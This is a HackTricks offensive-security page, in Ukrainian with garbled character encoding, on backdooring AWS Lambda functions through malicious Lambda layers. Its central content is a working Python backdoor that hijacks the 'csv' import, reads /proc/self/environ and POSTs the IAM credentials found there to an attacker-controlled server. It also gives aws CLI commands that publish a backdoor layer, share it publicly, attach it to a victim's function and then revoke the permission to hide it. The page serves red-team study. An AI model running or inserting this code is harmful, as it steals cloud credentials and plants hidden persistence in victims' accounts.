# AWS - –ó–±–µ—Ä–µ–∂–µ–Ω–Ω—è —à–∞—Ä—ñ–≤ Lambda

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>

## –®–∞—Ä–∏ Lambda

–®–∞—Ä Lambda - —Ü–µ .zip-–∞—Ä—Ö—ñ–≤, —è–∫–∏–π **–º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–π –∫–æ–¥** –∞–±–æ —ñ–Ω—à–∏–π –≤–º—ñ—Å—Ç. –®–∞—Ä –º–æ–∂–µ –º—ñ—Å—Ç–∏—Ç–∏ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, [–≤–ª–∞—Å–Ω–∏–π —Ä–∞–Ω—Ç–∞–π–º](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-custom.html), –¥–∞–Ω—ñ –∞–±–æ —Ñ–∞–π–ª–∏ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó.

–ú–æ–∂–ª–∏–≤–æ –≤–∫–ª—é—á–∏—Ç–∏ –¥–æ **–ø'—è—Ç–∏ —à–∞—Ä—ñ–≤ –Ω–∞ —Ñ—É–Ω–∫—Ü—ñ—é**. –ö–æ–ª–∏ –≤–∏ –≤–∫–ª—é—á–∞—î—Ç–µ —à–∞—Ä —É —Ñ—É–Ω–∫—Ü—ñ—é, **–≤–º—ñ—Å—Ç —Ä–æ–∑–ø–∞–∫–æ–≤—É—î—Ç—å—Å—è –≤ –∫–∞—Ç–∞–ª–æ–≥ `/opt`** –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è.

–ó–∞ **–∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**, **—à–∞—Ä–∏**, —è–∫—ñ –≤–∏ —Å—Ç–≤–æ—Ä—é—î—Ç–µ, **–ø—Ä–∏–≤–∞—Ç–Ω—ñ** –¥–ª—è –≤–∞—à–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS. –í–∏ –º–æ–∂–µ—Ç–µ –≤–∏–±—Ä–∞—Ç–∏ **–ø–æ–¥—ñ–ª–∏—Ç–∏—Å—è** —à–∞—Ä–æ–º –∑ —ñ–Ω—à–∏–º–∏ –æ–±–ª—ñ–∫–æ–≤–∏–º–∏ –∑–∞–ø–∏—Å–∞–º–∏ –∞–±–æ **–∑—Ä–æ–±–∏—Ç–∏** —à–∞—Ä **–ø—É–±–ª—ñ—á–Ω–∏–º**. –Ø–∫—â–æ –≤–∞—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —à–∞—Ä, —è–∫–∏–π –æ–ø—É–±–ª—ñ–∫—É–≤–∞–≤ —ñ–Ω—à–∏–π –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å, –≤–∞—à—ñ —Ñ—É–Ω–∫—Ü—ñ—ó –º–æ–∂—É—Ç—å **–ø—Ä–æ–¥–æ–≤–∂—É–≤–∞—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –≤–µ—Ä—Å—ñ—é —à–∞—Ä—É –ø—ñ—Å–ª—è –π–æ–≥–æ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –∞–±–æ –ø—ñ—Å–ª—è —Å–∫–∞—Å—É–≤–∞–Ω–Ω—è –≤–∞—à–æ–≥–æ –¥–æ–∑–≤–æ–ª—É –Ω–∞ –¥–æ—Å—Ç—É–ø –¥–æ —à–∞—Ä—É**. –û–¥–Ω–∞–∫ –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤—É —Ñ—É–Ω–∫—Ü—ñ—é –∞–±–æ –æ–Ω–æ–≤–∏—Ç–∏ —Ñ—É–Ω–∫—Ü—ñ—ó, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—á–∏ –≤–∏–¥–∞–ª–µ–Ω—É –≤–µ—Ä—Å—ñ—é —à–∞—Ä—É.

–§—É–Ω–∫—Ü—ñ—ó, —Ä–æ–∑–≥–æ—Ä–Ω—É—Ç—ñ —è–∫ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞, –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å —à–∞—Ä–∏. –ó–∞–º—ñ—Å—Ç—å —Ü—å–æ–≥–æ –≤–∏ —É–ø–∞–∫–æ–≤—É—î—Ç–µ –≤–∞—à –≤–∏–±—Ä–∞–Ω–∏–π —Ä–∞–Ω—Ç–∞–π–º, –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ —Ç–∞ —ñ–Ω—à—ñ –∑–∞–ª–µ–∂–Ω–æ—Å—Ç—ñ –≤ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –ø—ñ–¥ —á–∞—Å –ø–æ–±—É–¥–æ–≤–∏ –∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è.

### –®–ª—è—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è Python

–®–ª—è—Ö –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è, —è–∫–∏–π –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ Python –≤ lambda, —î –Ω–∞—Å—Ç—É–ø–Ω–∏–º:
```
['/var/task', '/opt/python/lib/python3.9/site-packages', '/opt/python', '/var/runtime', '/var/lang/lib/python39.zip', '/var/lang/lib/python3.9', '/var/lang/lib/python3.9/lib-dynload', '/var/lang/lib/python3.9/site-packages', '/opt/python/lib/python3.9/site-packages']
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ **–¥—Ä—É–≥–∞** —Ç–∞ —Ç—Ä–µ—Ç—è **–ø–æ–∑–∏—Ü—ñ—ó** –∑–∞–π–Ω—è—Ç—ñ –∫–∞—Ç–∞–ª–æ–≥–∞–º–∏, –¥–µ **—Ä–æ–∑–ø–∞–∫–æ–≤—É—é—Ç—å—Å—è —Ñ–∞–π–ª–∏** **lambda layers**: **`/opt/python/lib/python3.9/site-packages`** —Ç–∞ **`/opt/python`**

{% hint style="danger" %}
–Ø–∫—â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ **–∑–º—ñ–≥ –≤—Å—Ç–∞–≤–∏—Ç–∏ –∑–∞–¥–Ω—ñ–π –ø—Ä–æ—Ö—ñ–¥** –≤ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π **—à–∞—Ä lambda** –∞–±–æ **–¥–æ–¥–∞—Ç–∏ –æ–¥–∏–Ω**, —è–∫–∏–π –±—É–¥–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –¥–æ–≤—ñ–ª—å–Ω–∏–π –∫–æ–¥ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ –∑–∞–≥–∞–ª—å–Ω–æ—ó –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**, –≤—ñ–Ω –∑–º–æ–∂–µ –≤–∏–∫–æ–Ω–∞—Ç–∏ —à–∫—ñ–¥–ª–∏–≤–∏–π –∫–æ–¥ –ø—Ä–∏ –∫–æ–∂–Ω–æ–º—É –≤–∏–∫–ª–∏–∫—É lambda.
{% endhint %}

–û—Ç–∂–µ, –≤–∏–º–æ–≥–∏ —Ç–∞–∫—ñ:

* **–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏**, —è–∫—ñ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É—é—Ç—å—Å—è** –∫–æ–¥–æ–º –∂–µ—Ä—Ç–≤–∏
* –°—Ç–≤–æ—Ä—ñ—Ç—å **–ø—Ä–æ–∫—Å—ñ-–±—ñ–±–ª—ñ–æ—Ç–µ–∫—É –∑ —à–∞—Ä–∞–º–∏ lambda**, —è–∫–∞ –±—É–¥–µ **–≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –≤–ª–∞—Å–Ω–∏–π –∫–æ–¥** —Ç–∞ **–∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É** –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É.

### –ü–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏

{% hint style="warning" %}
–ü—ñ–¥ —á–∞—Å –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é —Ç–µ—Ö–Ω—ñ–∫–æ—é —è –∑—ñ—Ç–∫–Ω—É–≤—Å—è –∑ —Ç—Ä—É–¥–Ω–æ—â–∞–º–∏: –î–µ—è–∫—ñ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **–≤–∂–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ** –≤ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è python, –∫–æ–ª–∏ –≤–∞—à –∫–æ–¥ –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è. –Ø –æ—á—ñ–∫—É–≤–∞–≤ –∑–Ω–∞–π—Ç–∏ —Ç–∞–∫—ñ —Ä–µ—á—ñ, —è–∫ `os` –∞–±–æ `sys`, –∞–ª–µ **–Ω–∞–≤—ñ—Ç—å –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∞ `json` –±—É–ª–∞ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∞**.\
–î–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è —Ü—ñ—î—é —Ç–µ—Ö–Ω—ñ–∫–æ—é –ø–æ—Å—Ç—ñ–π–Ω–æ—Å—Ç—ñ, –∫–æ–¥ –ø–æ–≤–∏–Ω–µ–Ω **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –Ω–æ–≤—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É, —è–∫–∞ –Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è** –ø—ñ–¥ —á–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É.
{% endhint %}

–ó –∫–æ–¥–æ–º python, –ø–æ–¥—ñ–±–Ω–∏–º –¥–æ —Ü—å–æ–≥–æ, –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ **—Å–ø–∏—Å–æ–∫ –±—ñ–±–ª—ñ–æ—Ç–µ–∫, —è–∫—ñ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω—ñ** –≤ —Å–µ—Ä–µ–¥–æ–≤–∏—â—ñ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è python –≤ lambda:
```python
import sys

def lambda_handler(event, context):
return {
'statusCode': 200,
'body': str(sys.modules.keys())
}
```
–Ü –æ—Å—å —Ü–µ **—Å–ø–∏—Å–æ–∫** (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —â–æ –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏, —Ç–∞–∫—ñ —è–∫ `os` –∞–±–æ `json`, –≤–∂–µ —Ç–∞–º)
```
'sys', 'builtins', '_frozen_importlib', '_imp', '_thread', '_warnings', '_weakref', '_io', 'marshal', 'posix', '_frozen_importlib_external', 'time', 'zipimport', '_codecs', 'codecs', 'encodings.aliases', 'encodings', 'encodings.utf_8', '_signal', 'encodings.latin_1', '_abc', 'abc', 'io', '__main__', '_stat', 'stat', '_collections_abc', 'genericpath', 'posixpath', 'os.path', 'os', '_sitebuiltins', 'pwd', '_locale', '_bootlocale', 'site', 'types', 'enum', '_sre', 'sre_constants', 'sre_parse', 'sre_compile', '_heapq', 'heapq', 'itertools', 'keyword', '_operator', 'operator', 'reprlib', '_collections', 'collections', '_functools', 'functools', 'copyreg', 're', '_json', 'json.scanner', 'json.decoder', 'json.encoder', 'json', 'token', 'tokenize', 'linecache', 'traceback', 'warnings', '_weakrefset', 'weakref', 'collections.abc', '_string', 'string', 'threading', 'atexit', 'logging', 'awslambdaric', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib', 'awslambdaric.lambda_context', 'http', 'email', 'email.errors', 'binascii', 'email.quoprimime', '_struct', 'struct', 'base64', 'email.base64mime', 'quopri', 'email.encoders', 'email.charset', 'email.header', 'math', '_bisect', 'bisect', '_random', '_sha512', 'random', '_socket', 'select', 'selectors', 'errno', 'array', 'socket', '_datetime', 'datetime', 'urllib', 'urllib.parse', 'locale', 'calendar', 'email._parseaddr', 'email.utils', 'email._policybase', 'email.feedparser', 'email.parser', 'uu', 'email._encoded_words', 'email.iterators', 'email.message', '_ssl', 'ssl', 'http.client', 'runtime_client', 'numbers', '_decimal', 'decimal', '__future__', 'simplejson.errors', 'simplejson.raw_json', 'simplejson.compat', 'simplejson._speedups', 'simplejson.scanner', 'simplejson.decoder', 'simplejson.encoder', 'simplejson', 'awslambdaric.lambda_runtime_exception', 'awslambdaric.lambda_runtime_marshaller', 'awslambdaric.lambda_runtime_client', 'awslambdaric.bootstrap', 'awslambdaric.__main__', 'lambda_function'
```
–¶–µ —Å–ø–∏—Å–æ–∫ **–±—ñ–±–ª—ñ–æ—Ç–µ–∫**, —è–∫—ñ **lambda –≤–∫–ª—é—á–∞—î –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–º–∏ –∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º**: [https://gist.github.com/gene1wood/4a052f39490fae00e0c3](https://gist.github.com/gene1wood/4a052f39490fae00e0c3)

### –ü—ñ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—è –≤ Lambda Layer

–£ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –¥–∞–≤–∞–π—Ç–µ –ø—Ä–∏–ø—É—Å—Ç–∏–º–æ, —â–æ —Ü—ñ–ª—å–æ–≤–∏–π –∫–æ–¥ —ñ–º–ø–æ—Ä—Ç—É—î **`csv`**. –ú–∏ –±—É–¥–µ–º–æ **–ø—ñ–¥—Å—Ç–∞–≤–ª—è—Ç–∏ —ñ–º–ø–æ—Ä—Ç –±—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ `csv`**.

–î–ª—è —Ü—å–æ–≥–æ –º–∏ —Å—Ç–≤–æ—Ä–∏–º–æ –∫–∞—Ç–∞–ª–æ–≥ csv –∑ —Ñ–∞–π–ª–æ–º **`__init__.py`** –≤ –Ω—å–æ–º—É –∑–∞ —à–ª—è—Ö–æ–º, —è–∫–∏–π –∑–∞–≤–∞–Ω—Ç–∞–∂—É—î—Ç—å—Å—è lambda: **`/opt/python/lib/python3.9/site-packages`**\
–ü–æ—Ç—ñ–º, –∫–æ–ª–∏ lambda –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —ñ –Ω–∞–º–∞–≥–∞—î—Ç—å—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ **csv**, –Ω–∞—à **—Ñ–∞–π–ª `__init__.py` –±—É–¥–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–∏–π —ñ –≤–∏–∫–æ–Ω–∞–Ω–∏–π**.\
–¶–µ–π —Ñ–∞–π–ª –ø–æ–≤–∏–Ω–µ–Ω:

* –í–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—à—É –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å
* –ó–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—É –±—ñ–±–ª—ñ–æ—Ç–µ–∫—É csv

–ú–∏ –º–æ–∂–µ–º–æ —Ü–µ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```python
import sys
from urllib import request

with open("/proc/self/environ", "rb") as file:
url= "https://attacker13123344.com/" #Change this to your server
req = request.Request(url, data=file.read(), method="POST")
response = request.urlopen(req)

# Remove backdoor directory from path to load original library
del_path_dir = "/".join(__file__.split("/")[:-2])
sys.path.remove(del_path_dir)

# Remove backdoored loaded library from sys.modules
del sys.modules[__file__.split("/")[-2]]

# Load original library
import csv as _csv

sys.modules["csv"] = _csv
```
–ü–æ—Ç—ñ–º —Å—Ç–≤–æ—Ä—ñ—Ç—å zip-–∞—Ä—Ö—ñ–≤ –∑ —Ü–∏–º –∫–æ–¥–æ–º –∑–∞ —à–ª—è—Ö–æ–º **`python/lib/python3.9/site-packages/__init__.py`** —Ç–∞ –¥–æ–¥–∞–π—Ç–µ –π–æ–≥–æ —è–∫ —à–∞—Ä –ª—è–º–±–¥–∏.

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ —Ü–µ–π –∫–æ–¥ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º [**https://github.com/carlospolop/LambdaLayerBackdoor**](https://github.com/carlospolop/LambdaLayerBackdoor)

–Ü–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ **–Ω–∞–¥—Å–∏–ª–∞—Ç–∏–º–µ IAM-–ø–æ–≤–Ω–æ–≤–∞–∂–µ–Ω–Ω—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä –ü–ï–†–®–ò–ô –†–ê–ó, –∫–æ–ª–∏ –π–æ–≥–æ –≤–∏–∫–ª–∏–∫–∞—é—Ç—å –∞–±–æ –ü–Ü–°–õ–Ø —Å–∫–∏–¥–∞–Ω–Ω—è –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞ –ª—è–º–±–¥–∏** (–∑–º—ñ–Ω–∞ –∫–æ–¥—É –∞–±–æ —Ö–æ–ª–æ–¥–Ω–∞ –ª—è–º–±–¥–∞), –∞–ª–µ **—ñ–Ω—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏**, —Ç–∞–∫—ñ —è–∫ –Ω–∞—Å—Ç—É–ø–Ω—ñ, —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å –±—É—Ç–∏ —ñ–Ω—Ç–µ–≥—Ä–æ–≤–∞–Ω—ñ:

{% content-ref url="../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

### –ó–æ–≤–Ω—ñ—à–Ω—ñ —à–∞—Ä–∏

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ **—à–∞—Ä–∏ –ª—è–º–±–¥–∏ –∑ –∑–æ–≤–Ω—ñ—à–Ω—ñ—Ö –æ–±–ª—ñ–∫–æ–≤–∏—Ö –∑–∞–ø–∏—Å—ñ–≤**. –ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, –ª—è–º–±–¥–∞ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —à–∞—Ä –∑ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –Ω–∞–≤—ñ—Ç—å —è–∫—â–æ —É –Ω—å–æ–≥–æ –Ω–µ–º–∞—î –¥–æ–∑–≤–æ–ª—ñ–≤.\
–¢–∞–∫–æ–∂ –∑–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **–º–∞–∫—Å–∏–º–∞–ª—å–Ω–∞ –∫—ñ–ª—å–∫—ñ—Å—Ç—å —à–∞—Ä—ñ–≤, —è–∫—É –º–æ–∂–µ –º–∞—Ç–∏ –ª—è–º–±–¥–∞, - 5**.

–û—Ç–∂–µ, –¥–ª—è –ø–æ–∫—Ä–∞—â–µ–Ω–Ω—è —É–Ω—ñ–≤–µ—Ä—Å–∞–ª—å–Ω–æ—Å—Ç—ñ —Ü—ñ—î—ó —Ç–µ—Ö–Ω—ñ–∫–∏ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ:

* –í—Ä–∞–∑–∏—Ç–∏ —ñ—Å–Ω—É—é—á–∏–π —à–∞—Ä –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ (–Ω—ñ—á–æ–≥–æ –∑–æ–≤–Ω—ñ—à–Ω—å–æ–≥–æ)
* **–°—Ç–≤–æ—Ä–∏—Ç–∏** **—à–∞—Ä** —É **—Å–≤–æ—î–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ**, –Ω–∞–¥–∞—Ç–∏ **–∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ –¥–æ—Å—Ç—É–ø –¥–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —à–∞—Ä—É**, **–Ω–∞–ª–∞—à—Ç—É–≤–∞—Ç–∏** **—à–∞—Ä** –≤ –ª—è–º–±–¥—ñ –∂–µ—Ä—Ç–≤–∏ —Ç–∞ **–≤–∏–¥–∞–ª–∏—Ç–∏ –¥–æ–∑–≤—ñ–ª**.
* –õ—è–º–±–¥–∞ –≤—Å–µ —â–µ –∑–º–æ–∂–µ **–≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —à–∞—Ä**, –∞ –∂–µ—Ä—Ç–≤–∞ –Ω–µ –º–∞—Ç–∏–º–µ –ø—Ä–æ—Å—Ç–æ–≥–æ —Å–ø–æ—Å–æ–±—É **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ –∫–æ–¥ —à–∞—Ä—ñ–≤** (–æ–∫—Ä—ñ–º –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –æ–±–µ—Ä–Ω–µ–Ω–æ–≥–æ —à–µ–ª—É –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –ª—è–º–±–¥–∏)
* –ñ–µ—Ä—Ç–≤–∞ **–Ω–µ –ø–æ–±–∞—á–∏—Ç—å –∑–æ–≤–Ω—ñ—à–Ω—ñ —à–∞—Ä–∏**, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –∑ **`aws lambda list-layers`**

{% code overflow="wrap" %}
```bash
# Upload backdoor layer
aws lambda publish-layer-version --layer-name "ExternalBackdoor" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"

# Give everyone access to the lambda layer
## Put the account number in --principal to give access only to an account
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion

## Add layer to victims Lambda

# Remove permissions
aws lambda remove-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1
```
{% endcode %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
